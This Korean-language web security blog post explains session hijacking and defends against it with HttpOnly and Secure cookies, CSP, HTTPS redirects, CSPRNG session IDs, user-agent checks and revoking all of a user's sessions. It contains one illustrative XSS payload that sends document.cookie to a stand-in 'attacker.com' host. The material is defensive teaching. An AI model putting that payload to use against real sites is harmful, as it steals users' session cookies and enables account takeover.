---
title: "세션 하이재킹(Session Hijacking) 완전 정복"
description: "세션 하이재킹의 6가지 공격 기법과 각각의 방어 방법을 다룹니다. XSS 쿠키 탈취, 네트워크 스니핑, 세션 예측, CSRF 등 실전 방어 코드와 함께 설명합니다."
author: "PALDYN Team"
pubDate: "2026-06-01"
archiveOrder: 9
type: "knowledge"
category: "Security"
tags: ["세션하이재킹", "SessionHijacking", "쿠키탈취", "XSS", "세션보안"]
featured: false
draft: false
---

[지난 글](/posts/websec-session-fixation/)에서 세션 고정 공격을 다뤘다. 이번에는 세션을 탈취하는 더 넓은 범주인 **세션 하이재킹(Session Hijacking)**을 다룬다.

## 세션 하이재킹이란

세션 하이재킹은 공격자가 정당한 사용자의 세션 ID를 획득해 그 사용자처럼 행동하는 공격의 총칭이다. 로그인 과정 자체를 공격하지 않고, 이미 인증된 세션을 가로채기 때문에 더 은밀하고 탐지가 어려울 수 있다.

![세션 하이재킹 공격 기법 6가지](/assets/posts/websec-session-hijacking-methods.svg)

## 공격 기법별 방어

### ① XSS를 통한 쿠키 탈취

```javascript
// 공격자의 XSS 페이로드
new Image().src = "https://attacker.com/steal?c=" +
    encodeURIComponent(document.cookie);
```

**방어**: `HttpOnly` 쿠키로 JavaScript의 쿠키 접근을 차단한다. CSP로 외부 요청을 제한한다.

### ② 네트워크 스니핑

```python
# Nginx: HTTP를 HTTPS로 강제 리다이렉트
# server { listen 80; return 301 https://$host$request_uri; }
```

**방어**: 모든 트래픽을 HTTPS로 강제하고, 쿠키에 `Secure` 속성을 설정한다.

### ③ 세션 ID 예측

```python
import secrets
# 좋은 예: CSPRNG 기반
good_sid = secrets.token_hex(32)  # 256비트 무작위
# 나쁜 예: 예측 가능
# import time; bad_sid = str(hash(time.time()))
```

## 세션 유효성 강화

```python
import hashlib

def hash_ua(user_agent: str) -> str:
    return hashlib.sha256(user_agent.encode()).hexdigest()[:16]

async def create_session(user_id: str, request) -> str:
    sid = secrets.token_hex(32)
    ua = request.headers.get("user-agent", "")
    session_data = {
        "user_id": user_id,
        "ua_hash": hash_ua(ua),
        "created_at": time.time(),
        "last_seen": time.time(),
    }
    await r.setex(f"session:{sid}", 1800, json.dumps(session_data))
    await r.sadd(f"user_sessions:{user_id}", sid)
    return sid
```

![세션 하이재킹 방어 구현](/assets/posts/websec-session-hijacking-defense.svg)

## 이상 행동 탐지와 전체 로그아웃

```python
async def revoke_all_sessions(user_id: str):
    session_ids = await r.smembers(f"user_sessions:{user_id}")
    for sid in session_ids:
        await r.delete(f"session:{sid.decode()}")
    await r.delete(f"user_sessions:{user_id}")
```

## 방어 체크리스트

| 공격 | 방어 |
|------|------|
| XSS 쿠키 탈취 | HttpOnly + CSP |
| 네트워크 스니핑 | HTTPS + Secure 쿠키 + HSTS |
| 세션 ID 예측 | CSPRNG (128비트+) |
| 세션 고정 | 로그인 후 세션 재생성 |
| CSRF 세션 악용 | SameSite=Strict + CSRF 토큰 |
| 탈취 지속 | UA 검사 + 이상 행동 탐지 + 전체 로그아웃 |

---

**지난 글:** [세션 고정(Session Fixation) 공격과 방어](/posts/websec-session-fixation/)

**다음 글:** [JWT 보안: 올바른 사용법과 취약점](/posts/websec-jwt-security/)

<br>
읽어주셔서 감사합니다. 😊
